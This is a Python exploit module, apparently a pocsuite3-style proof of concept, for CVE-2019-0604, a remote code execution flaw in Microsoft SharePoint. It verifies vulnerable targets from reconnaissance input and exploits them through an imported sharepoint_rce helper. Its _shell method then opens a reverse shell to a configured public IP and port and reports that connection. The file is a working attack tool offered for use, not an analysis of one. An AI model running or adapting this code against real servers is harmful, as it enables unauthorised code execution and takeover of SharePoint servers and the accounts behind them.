"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Framework.Library.Function.Function.PocSuite.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths, POC_SCAN
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import codecs 
from multiprocessing import Process
from lxml import html
import time
import uuid 
from xml.sax.saxutils import escape 
from urllib.parse import urlparse, urljoin
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2019_0604 import sharepoint_rce
from Framework.Library.Function.Function.PocSuite.Function import  decode_data_input_poc


class DemoPOC(POCBase):
    vulID = 'CVE-2019-0604'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2019'
    createDate = '2019-03-13'
    
    updateDate = '2019-03-13'
    references = ['https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability']
    name = 'Sharepoint - Microsoft Sharepoint RCE vulnerability'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.ASP],
                "pocType": "Windows",
                "folder_init": "cve_2019_0604"}
    appName = 'windows_sharepoint_cve_2019_0604'
    appVersion = 'CVE_2019_0604'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the SharePoint application pool and the SharePoint server farm account.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 7.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''

         
    def _verify(self, update=True):
        if update: 
            config_input, Referer = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input["Input"]['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        self.vul_url = []
        for url in self.url: 
            try: 
                vul_url_after_check = sharepoint_rce.verify(url)
                if vul_url_after_check: 
                    self.vul_url.append(vul_url_after_check)
            except Exception as e:
                pass 
        if len(self.vul_url) > 0: 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.vul_url
        if update: 
            return self.parse_output(result)
        else: 
            return result

    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
            host_check_connect = config_input['Config']['Cf_Host_Check_Connect']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        vul_url = []
        cmd = ''
        if len(self._verify(update=False)) > 0: 
            for url in self.vul_url: 
                try: 
                    try_exploit = sharepoint_rce.exploit(url, host_check_connect)
                    if try_exploit: 
                        cmd = try_exploit
                        vul_url.append(url)
                except Exception as e : 
                    pass
            if len(vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  vul_url
                result["ShellInfo"]['cmd'] = cmd
                result['ShellInfo']['info'] = '''Sharepoint RCE cve-2019-0604 ''' 


    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                host_check_connect = config_input['Config']['Cf_Host_Check_Connect']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            sharepoint_rce.rce(self.url,host_check_connect, lhost_running, lport_running)
            result["url"] = self.url
            result["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running

            }
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
